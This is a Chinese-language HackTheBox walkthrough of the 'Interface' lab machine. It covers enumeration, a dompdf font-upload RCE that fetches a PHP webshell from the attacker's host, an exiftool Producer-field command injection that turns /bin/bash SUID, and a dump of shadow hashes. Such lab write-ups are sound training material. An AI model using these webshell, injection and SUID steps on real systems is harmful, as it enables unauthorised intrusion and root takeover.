---
title: Interface - HackTheBox
url: https://darkwing.moe/2023/02/13/Interface-HackTheBox/
source: 喵喵喵喵
date: 2023-02-14
fetch_date: 2025-10-04T06:28:51.003762
---

# Interface - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

Interface - HackTheBox

# Interface - HackTheBox

##### 2023-02-13

#### TOC

1. [1. 基本信息](#基本信息)
   1. [1.1. 10.10.11.200](#10-10-11-200)
2. [2. 端口扫描](#端口扫描)
   1. [2.1. 80](#80)
   2. [2.2. prd.m.rendering-api.interface.htb](#prd-m-rendering-api-interface-htb)
3. [3. 目录扫描](#目录扫描)
4. [4. dompdf](#dompdf)
   1. [4.1. reverse shell](#reverse-shell)
5. [5. user flag](#user-flag)
6. [6. 提权信息](#提权信息)
7. [7. 提权 & root flag](#提权-amp-root-flag)
   1. [7.1. shadow](#shadow)
8. [8. 参考资料](#参考资料)

# Interface - HackTheBox

2023-02-13

# 基本信息

* <https://www.hackthebox.com/home/machines/profile/527>
* ## 10.10.11.200

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021301.jpg)

# 端口扫描

22和80:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ``` | ``` $ nmap -sC -sV -Pn 10.10.11.200 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-13 13:15 CST Nmap scan report for 10.10.11.200 Host is up (0.075s latency). Not shown: 998 closed tcp ports (conn-refused) PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   2048 7289a0957eceaea8596b2d2dbc90b55a (RSA) |   256 01848c66d34ec4b1611f2d4d389c42c3 (ECDSA) |_  256 cc62905560a658629e6b80105c799b55 (ED25519) 80/tcp open  http    nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: Site Maintenance Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 25.39 seconds ``` |

## 80

没什么东西，但CSP中能得到一个域名：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021302.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021303.jpg)

## prd.m.rendering-api.interface.htb

添加host后直接访问是file not found：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` 10.10.11.200 prd.m.rendering-api.interface.htb ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021304.jpg)

# 目录扫描

目录扫描发现vendor和api,继续一步步扫描，注意扫描参数:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ``` | ``` gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt  -t 50 -u "http://prd.m.rendering-api.interface.htb" -s 200,403,404 -b "" --exclude-length 0  /api                  (Status: 404) [Size: 50] /api/experiments      (Status: 404) [Size: 50] /api/experiments/configurations (Status: 404) [Size: 50] /vendor               (Status: 403) [Size: 15]  gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt  -t 50 -u "http://prd.m.rendering-api.interface.htb/vendor/" -s 200,403,404 -b "" --exclude-length 0,50  /dompdf               (Status: 403) [Size: 15] /composer             (Status: 403) [Size: 15]   ffuf -u http://prd.m.rendering-api.interface.htb/api/FUZZ -X POST -w ~/Tools/dict/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -mc all -fs 50  [Status: 422, Size: 36, Words: 2, Lines: 1, Duration: 108ms]     * FUZZ: html2pdf ``` |

# dompdf

根据已有信息进行搜索，发现dompdf相关漏洞：

* From XSS to RCE (dompdf 0day) | Positive Security
  <https://positive.security/blog/dompdf-rce>
* positive-security/dompdf-rce: RCE exploit for dompdf
  <https://github.com/positive-security/dompdf-rce>

根据前面的结果，应该是html2pdf调用了pdf，我们需要通过这个api利用dompdf的漏洞：

(pentesterlab里也有dompdf相关的，也可以去做一下)

就是用github里的内容，修改exploit.css中的php链接，修改php文件中的代码，通过html2pdf上传字体文件(参数格式也是常规fuzz)：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021305.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021306.jpg)

然后根据命名规则计算出服务器上webshell的路径：

|  |  |
| --- | --- |
| ``` 1 2 3 4 ``` | ``` $ echo -n 'http://10.10.14.10:7777/exploit_font.php' | md5sum 78e00b92375ea46740203760ffdd85fd  -  http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_78e00b92375ea46740203760ffdd85fd.php?cmd=whoami ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021307.jpg)

## reverse shell

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021308.jpg)

# user flag

得到的是www-data shell,但有权限读dev用户目录的user.txt:

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021309.jpg)

# 提权信息

root权限定时运行/usr/local/sbin/cleancache.sh，查看内容发现是通过exiftool检查/tmp目录下的文件的Producer是否是dompdf，然后进行清理，我们可以利用这一点进行命令注入：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021310.jpg)

# 提权 & root flag

准备一个要执行的文件，因为已经知道tmp目录有自动清理，所有使用其他可写目录:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 ``` | ``` bash-4.4$ cat > /dev/shm/shell.sh << EOF cat > /dev/shm/shell.sh << EOF > #!/bin/bash #!/bin/bash > chmod +s /bin/bash chmod +s /bin/bash > EOF bash-4.4$ chmod +x /dev/shm/shell.sh ``` |

tmp目录下创建一个文件，修改Producer进行命令注入，等待触发：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` /usr/bin/exiftool -Producer='a[$(/dev/shm/shell.sh>&2)]+42' /tmp/exp ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021311.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023021312.jpg)

## shadow

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` root:$6$vNqg/kOl$yP48ihB9Tz5fyR0bjFvDk/ZMwmOpr/a6Bx7Z3fpsTNQM.k2ip0weEHpNr2C0OY2qEIspg4KuTtB3R32.bPieX0:19316:0:99999:7::: dev:$6$2RlsJ6Cm$3qBSlRXSbX0tjTK7orUlt3Wub/ahd1f5kAVDhnvd8zm2vFuPotd7o04vH04OgPjdvsfUp2sOpqQJz5Cge2h4C0:19367:0:99999:7::: ``` |

# 参考资料

* From XSS to RCE (dompdf 0day) | Positive Security
  <https://positive.security/blog/dompdf-rce>
* positive-security/dompdf-rce: RCE exploit for dompdf
  <https://github.com/positive-security/dompdf-rce>
* Interface - HTB [Discussion] | BreachForums
  <https://breached.vc/Thread-Interface-HTB-Discussion>

> Last updated: 2023-05-15 13:27:28
>
> 水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
>
> [![暗羽](/img/avatar.jpg)
> 暗羽](https://darkwing.moe)

* [HackTheBox](/tags/HackTheBox/)

[Prev

#### Bagel - HackTheBox](/2023/02/20/Bagel-HackTheBox/)

[Next

#### Encoding - HackTheBox](/2023/02/02/Encoding-HackTheBox/)

站点总访客数：

站点总访问量：

This blog is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).

暗羽 © 2014 - 2025

Power by [Hexo](http://hexo.io/) Theme [indigo](https://github.com/yscoder/hexo-theme-indigo)

扫一扫，分享到微信

![微信分享二维码](data:image/png;base64...)

- [{title}

  {tags}

  {date}](%7Bpath%7D)